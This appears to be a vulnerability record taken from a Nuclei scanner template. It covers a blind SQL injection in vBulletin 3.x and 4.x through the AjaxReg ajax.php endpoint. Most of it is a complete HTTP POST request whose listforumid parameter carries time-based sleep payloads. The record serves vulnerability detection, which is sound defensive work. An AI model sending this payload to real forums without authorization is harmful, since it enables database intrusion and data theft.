# Vulnerability: vBulletin 3.x / 4.x AjaxReg - SQL Injection
**Classification:** CWE-89
**Source:** Nuclei Template (`vbulletin-ajaxreg-sqli.yaml`)

## Description
vBulletin versions 3.x and 4.x suffer from an AjaxReg remote blind SQL injection vulnerability.

## Vulnerable Code Pattern / Exploit Payload
```http
@timeout: 20s
POST /ajax.php?do=inforum&listforumid=(select(0)from(select(sleep(6)))v)/*'%2B(select(0)from(select(sleep(6)))v)%2B'"%2B(select(0)from(select(sleep(6)))v)%2B"*/&result=10 HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

undefined&s=&securitytoken=guest
```

